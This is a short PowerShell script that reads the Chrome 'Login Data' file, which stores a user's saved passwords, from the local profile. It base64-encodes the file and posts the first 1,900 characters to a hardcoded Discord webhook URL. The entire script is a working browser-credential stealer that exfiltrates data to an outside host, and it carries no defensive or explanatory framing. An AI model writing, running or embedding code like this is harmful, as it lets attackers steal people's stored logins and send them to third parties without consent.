# Set the path to your file
$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Check if the file exists using -LiteralPath to handle spaces
if (-Not (Test-Path -LiteralPath $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read file content as bytes
$fileBytes = [System.IO.File]::ReadAllBytes($filePath)

# Convert bytes to Base64 string
$fileBase64 = [System.Convert]::ToBase64String($fileBytes)

# Limit base64 string length for Discord message (max ~1900 chars)
$maxLength = 1900
if ($fileBase64.Length -gt $maxLength) {
    $fileBase64 = $fileBase64.Substring(0, $maxLength) + "..."
}

# Escape backslashes and quotes (none expected in base64 but just in case)
$safeBase64 = $fileBase64.Replace('\', '\\').Replace('"', '\"')

# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Manually build JSON payload string to avoid ConvertTo-Json issues
$jsonPayload = "{`"content`": `"Base64 preview of Login Data (first $maxLength chars):\n```txt\n$safeBase64\n```\"}"

# Send POST request to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonPayload -ContentType 'application/json'

Write-Host "Base64 file preview sent to Discord webhook."
